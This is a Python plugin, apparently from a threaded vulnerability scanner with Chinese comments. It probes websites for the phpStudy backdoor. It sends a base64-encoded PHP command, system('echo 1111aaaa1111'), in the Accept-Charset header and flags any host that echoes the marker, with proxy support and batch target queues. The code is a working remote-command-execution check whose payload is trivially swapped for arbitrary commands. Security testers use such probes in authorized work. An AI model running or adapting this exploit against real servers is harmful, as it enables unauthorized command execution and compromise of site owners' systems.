import requests
import threading
from termcolor import cprint
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


class Detect(threading.Thread):
    name = 'phpstudy'

    def __init__(self, alive_Web_queue, pbar, vul_list, requests_proxies):
        threading.Thread.__init__(self)
        self.alive_Web_queue = alive_Web_queue      # 存活web的队列
        self.pbar = pbar  # 进度条
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}

    def run(self):
        while not self.alive_Web_queue.empty():
            alive_web = self.alive_Web_queue.get()
            self.pbar.set_postfix(url=alive_web, vul=self.name)  # 进度条的显示
            self.run_detect(alive_web.rstrip('/'))
            self.pbar.update(1)  # 每完成一个任务，进度条也加+1
            self.alive_Web_queue.task_done()

    # 只需要修改下面的代码就行
    def run_detect(self, url):
        headers = {'Accept-Encoding': 'gzip,deflate',
                   'Accept-Charset': 'c3lzdGVtKCdlY2hvIDExMTFhYWFhMTExMScpOw=='}      # system('echo 1111aaaa1111');
        try:
            res = requests.get(url=url, headers=headers, allow_redirects=False, proxies=self.proxies, timeout=10)
            if '1111aaaa1111' in res.text:
                tqdm.write(Fore.RED + '[phpstudy] {}'.format(url))
                self.vul_list.append(['phpstudy', url, 'YES'])
            else:
                pass
                # print('[phpstudy -] {}'.format(url))
        except Exception as e:
            pass
            # print('[phpstudy error] {}: {}'.format(url, e.args))

if __name__ == '__main__':
    from queue import Queue

    alive_web = ['']
    vul_list = []
    proxy = r''
    requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    # requests_proxies = None
    alive_Web_queue = Queue(-1)  # 将存活的web存入队列里
    for _ in alive_web:
        alive_Web_queue.put(_)

    threads = []
    thread_num = 1  # 漏洞检测的线程数目

    pbar = tqdm(total=alive_Web_queue.qsize(), desc="检测漏洞", ncols=150)  # total是总数

    for num in range(1, thread_num + 1):
        t = Detect(alive_Web_queue, pbar, vul_list, requests_proxies)  # 实例化漏洞类，传递参数：存活web的队列，  存储漏洞的列表
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    tqdm.write(Fore.BLACK + '-'*50 + '结果' + '-'*50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))